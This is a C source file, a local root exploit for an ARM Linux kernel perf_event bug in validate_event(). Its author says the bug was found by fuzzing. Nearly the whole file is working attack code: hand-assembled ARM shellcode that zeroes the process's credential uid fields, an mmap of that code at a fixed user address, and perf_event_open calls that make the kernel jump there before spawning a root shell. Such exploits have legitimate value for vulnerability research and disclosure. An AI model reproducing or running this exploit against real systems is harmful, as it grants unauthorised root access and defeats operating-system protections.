/* arm_perf_exploit -- with working shellcode */

/* This bug found via my perf_fuzzer tool */

/* on ARM, in arch/arm/kernel/perf_event.c validate_event()          */
/* the code assumes all events are of type arm_pmu, and calls        */
/*    armpmu->get_event_idx(hw_events, event)                        */
/* However, if the group leader is *not* armpmu but another type     */
/* then an address at that offset from that PMU type is called       */
/*  On my particular machine, if type is "2" then the offset pointed */
/*  to is 0x80000000 which can be mmap()'d by a user program         */
/*  and the kernel executes this code.                               */

/* by Vince Weaver <vincent.weaver _at_ maine.edu */
/* 7 August 2013 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

int fd[2];
struct perf_event_attr pe[2];

/* We want to set the uid fields all to zero */
/* On arm you find:
      thread_info=(SP&~8191);
      task_struct=thread_info+12;
      cred_struct=task_struct+732; 
      // find that offset easily by disassembling copy_creds
      Then the uid fields start at offset 4
*/

void test_code(void) {
  asm volatile("push {r0,r1}");
  asm volatile("mov  r0,sp");
  asm volatile("mov  r1,#0x2000");
  asm volatile("sub  r1,r1,#1");
  asm volatile("mvn  r1,r1");
  asm volatile("and  r0,r0,r1");
  asm volatile("add  r0,r0,#12");
  asm volatile("ldr  r0,[r0,#732]"); // from copy_creds disasssem
  asm volatile("mov  r1,#0");
  asm volatile("str r1,[r0,#4]");
  asm volatile("str r1,[r0,#8]");
  asm volatile("str r1,[r0,#12]");
  asm volatile("str r1,[r0,#16]");
  asm volatile("str r1,[r0,#20]");
  asm volatile("str r1,[r0,#24]");
  asm volatile("str r1,[r0,#28]");
  asm volatile("str r1,[r0,#32]");
  asm volatile("pop {r0,r1}");
  asm volatile("bx lr");
}

/* My kernel is compiled in arm32 so can't use thumb2 */
char *SC=
    "\x03\x00\x2d\xe9"  // 00: e92d0003        push    {r0, r1}                                
    "\x0d\x00\xa0\xe1"  // 04: e1a0000d        mov     r0, sp                                  
    "\x02\x1a\xa0\xe3"  // 08: e3a01a02        mov     r1, #8192       ; 0x2000                
    "\x01\x10\x41\xe2"  // 0C: e2411001        sub     r1, r1, #1                              
    "\x01\x10\xe0\xe1"  // 10: e1e01001        mvn     r1, r1                                  
    "\x01\x00\x00\xe0"  // 14: e0000001        and     r0, r0, r1                              
    "\x0c\x00\x80\xe2"  // 18: e280000c        add     r0, r0, #12                             
    "\x00\x00\x90\xe5"  // 1c: e5900000        ldr     r0, [r0]
    "\xdc\x02\x90\xe5"  // 20: e59002dc        ldr     r0, [r0, #732]  ; 0x2dc                 
    "\x00\x10\xa0\xe3"  // 24: e3a01000        mov     r1, #0                                  
    "\x04\x10\x80\xe5"  // 28: e5801004        str     r1, [r0, #4]                            
    "\x08\x10\x80\xe5"  // 2c: e5801008        str     r1, [r0, #8]                            
    "\x0c\x10\x80\xe5"  // 30: e580100c        str     r1, [r0, #12]                           
    "\x10\x10\x80\xe5"  // 34: e5801010        str     r1, [r0, #16]                           
    "\x14\x10\x80\xe5"  // 38: e5801014        str     r1, [r0, #20]                           
    "\x18\x10\x80\xe5"  // 3c: e5801018        str     r1, [r0, #24]                           
    "\x1c\x10\x80\xe5"  // 40: e580101c        str     r1, [r0, #28]                           
    "\x03\x00\xbd\xe8"  // 44: e8bd0003        pop     {r0, r1}                                
    "\x1e\xff\x2f\xe1"  // 48: e12fff1e        bx      lr                              
;

int perf_event_open(struct perf_event_attr *hw_event_uptr,
	pid_t pid, int cpu, int group_fd, unsigned long flags) {

	return syscall(__NR_perf_event_open,hw_event_uptr, pid, cpu,
		group_fd, flags);
}


int main(int argc, char **argv) {

	char *our_page;
	char *arg[] = {"/bin/sh", 0};

	printf("Before uid: %d\n",getuid());

	/* MMAP a page at 0x8000000 */
	/* You might need to change this.  See where the PC is */
	/* in the oops message.                                */

	our_page=mmap(0x80000000,4096,PROT_WRITE|PROT_EXEC|PROT_READ,
			MAP_PRIVATE|MAP_ANONYMOUS,
			-1,0);


	/* Copy the shellcode to our page */
	memcpy(our_page,SC,21*4);

	/* Set up a group leader of type 2, which is */
	/* tracepoint.  On my pandaboard running     */
	/* 3.11-rc4 the offset past the tracepoint_pmu */
	/* structure is 0x80000000 a nice userspace  */
	/* address.                                  */
	/* You can also try the breakpoint and software pmu */
	/* types in case they give a better offset          */

	memset(&pe[0],0,sizeof(struct perf_event_attr));
	pe[0].type=2;
	pe[0].config=72;
	pe[0].size=80;

        fd[0]=perf_event_open(&pe[0],0,0,-1,0 /*0*/ );

	/* This is the key to the bug, if the group leader is not hardware */
	/* but the child event is hardware, then the kernel tries to       */
	/* Validate both as hardware, thus the bug.                        */

	memset(&pe[1],0,sizeof(struct perf_event_attr));
	pe[1].type=PERF_TYPE_RAW;
	pe[1].size=80;

	fd[1]=perf_event_open(&pe[1],0,0,fd[0],0 /*0*/ );

	/* In theory we jumped to a user address (we assume 0x8000000) */
	/* as the kernel.   The shellcode was run and then we return   */
	/* here...                                                     */

	/* Run a shell */

	printf("After uid: %d\n",getuid());
	execve("/bin/sh",arg,NULL);

	return 0;
}
